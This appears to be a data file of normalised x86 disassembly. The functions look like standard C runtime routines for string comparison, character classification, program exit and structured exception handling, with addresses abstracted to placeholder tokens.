push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_1002a840
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1002a8c8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1002f139
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1002c605
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10034130
mov [ esi + 0x4 ] eax
sub_1002a94f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_100345ed
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002a9a0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002a94f
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_1002a9ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_100345ed
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002aa1f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002a9ce
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_1002aa4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100345ed
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002aa9e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002aa4d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1002aacc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_100345ed
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002ab1d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002aacc
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1002ab4b
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_1002ab7b
mov edi edi
push ebp
mov ebp esp
call sub_10031d49
push [ ebp + 0x8 ]
call sub_10031b9e
push [ rw-data ]
call sub_1002eeed
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_1002aba4
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1002abf9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_1002ac16
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1002ac3a
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_100346a5
push r--data
push r--data
call sub_1002ac16
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_10034760
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_1002fbaf
call sub_1002c1a3
mov eax r--data
mov [ esp ] r--data
call sub_1002abf9
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_10034760
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1002acbf
push 0x18
push r--data
call sub_1002fdfc
push 0x8
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002add6
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1002fe41
retn
mov [ rw-data ] ebx
push 0x8
call sub_10030124
pop ecx
push [ ebp + 0x8 ]
call sub_1002abcf
push r--data
mov eax r--data
call sub_1002abf9
pop ecx
push [ rw-data ]
call sub_1002eeed
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_1002abf9
pop ecx
push [ rw-data ]
call sub_1002eeed
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_1002eee4
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_1002eeed
mov edi eax
call sub_1002eee4
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_1002eeed
mov edi eax
push [ rw-data ]
call sub_1002eeed
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_1002ae26
mov edi edi
push esi
call sub_1002eee4
mov esi eax
push esi
call sub_1002e845
push esi
call sub_10034ad3
push esi
call sub_100276ca
push esi
call sub_10031f01
push esi
call sub_10034ac4
push esi
call sub_100348b2
push esi
call sub_1000d3de
push esi
call sub_100348a1
push sub_1002ae01
call sub_1002ee72
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_1002ae74
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_1002aec0
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1002aef9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1002af4d
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002bf96
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1002af83
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10027150
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002bf96
add esp 0x20
pop esi
pop ebp
retn
sub_1002afb6
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1002b08d
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1002f139
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1002b08d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10027150
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002bf96
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1002afb6
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1002aef9
pop ebx
leave
retn
sub_1002b12c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_10034869
call sub_10034869
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1002b1a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1002f139
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1002f139
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1002b1cd
mov edi edi
push ebp
mov ebp esp
call sub_1002f139
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1002b1f4
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002f139
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1002f139
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1002f139
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_10034869
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_1002b246
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1002af83
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_10034b50
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1002b2a6
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1002b2d9
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1002b30f
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1002b345
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1002b3b0
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10027401
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002b3d9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100274ce
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1002b400
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1002b45f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_1002f139
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_1002f139
add eax 0x90
dec [ eax ]
call sub_1002f139
and [ eax + 0x90 ] 0x0
jmp sub_1003481d
sub_1002b4a8
push 0x10
push r--data
call sub_1002fdfc
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b56e
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1002f139
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1002fe41
retn
call sub_10034869
call sub_10034869
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_10034b50
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1002b589
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1002f139
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1002b5ce
push 0x8
push r--data
call sub_1002fdfc
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1002fe41
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1002aef2
mov [ ebp - 0x4 ] 0xfffffffe
sub_1002b623
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1002b65f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_10034869
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_1002b400
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1002b723
push 0x2c
push r--data
call sub_1002fdfc
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_1002b1a1
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1002f139
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1002f139
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1002f139
mov [ eax + 0x88 ] esi
call sub_1002f139
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1002b246
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1002b849
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
sub_1002b7bc
mov esp [ ebp - 0x18 ]
call sub_1002f139
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1002b4a8
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1002b849
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1002b849
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_1002b1f4
pop ecx
call sub_1002f139
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1002f139
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
